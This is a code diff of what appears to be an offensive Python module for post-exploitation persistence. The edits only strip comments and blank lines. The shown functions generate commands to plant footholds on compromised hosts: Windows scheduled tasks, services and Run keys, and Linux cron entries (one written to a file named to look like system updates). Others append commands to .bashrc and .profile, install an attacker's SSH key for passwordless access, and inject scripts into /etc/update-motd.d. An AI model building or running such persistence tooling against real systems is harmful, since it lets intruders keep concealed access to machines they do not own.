@@ -9,18 +9,15 @@ from __future__ import annotations
 from pathlib import PureWindowsPath
 
 __all__ = [
-    # Windows
     "schtask_command",
     "service_command",
     "runkey_command",
-    # Linux
     "crontab_command",
     "systemd_user_service",
     "bashrc_persistence",
     "ssh_authorized_key",
     "motd_persistence",
 ]
-
 
 def schtask_command(
     name: str, cmd: str, *, trigger: str = "ONLOGON", user: str | None = None
@@ -35,7 +32,6 @@ def schtask_command(
             target_user,
         ]
     )
-
 
 def service_command(
     name: str, bin_path: str, *, display_name: str | None = None
@@ -52,14 +48,9 @@ def service_command(
         ]
     )
 
-
 def runkey_command(name: str, value: str, *, hive: str = "HKCU") -> str:
     key = rf"{hive}\Software\Microsoft\Windows\CurrentVersion\Run"
     return rf'reg add "{key}" /v "{name}" /t REG_SZ /d "{value}" /f'
-
-
-# ── Linux ─────────────────────────────────────────────────────────────────────
-
 
 def crontab_command(
     cmd: str,
@@ -79,7 +70,6 @@ def crontab_command(
         entry = f"{schedule} {user} {cmd}"
         return [f"echo '{entry}' | tee -a /etc/cron.d/sysupdates"]
     return [f"(crontab -l 2>/dev/null; echo '{schedule} {cmd}') | crontab -"]
-
 
 def systemd_user_service(
     name: str,
@@ -117,7 +107,6 @@ def systemd_user_service(
         f"{start_cmd} {name}",
     ]
 
-
 def bashrc_persistence(cmd: str, *, profile: bool = False) -> list[str]:
     """Return commands to append a persistent entry to ``.bashrc`` or ``.profile``.
 
@@ -129,7 +118,6 @@ def bashrc_persistence(cmd: str, *, profile: bool = False) -> list[str]:
         targets.append("~/.profile")
     return [f"echo '{cmd}' >> {t}" for t in targets]
 
-
 def ssh_authorized_key(public_key: str, *, user_home: str = "~") -> list[str]:
     """Return commands to install an SSH public key for passwordless access."""
     return [
@@ -138,7 +126,6 @@ def ssh_authorized_key(public_key: str, *, user_home: str = "~") -> list[str]:
         f"echo '{public_key}' >> {user_home}/.ssh/authorized_keys",
         f"chmod 600 {user_home}/.ssh/authorized_keys",
     ]
-
 
 def motd_persistence(cmd: str) -> list[str]:
     """Return commands to inject persistence via ``/etc/update-motd.d/`` (requires root)."""
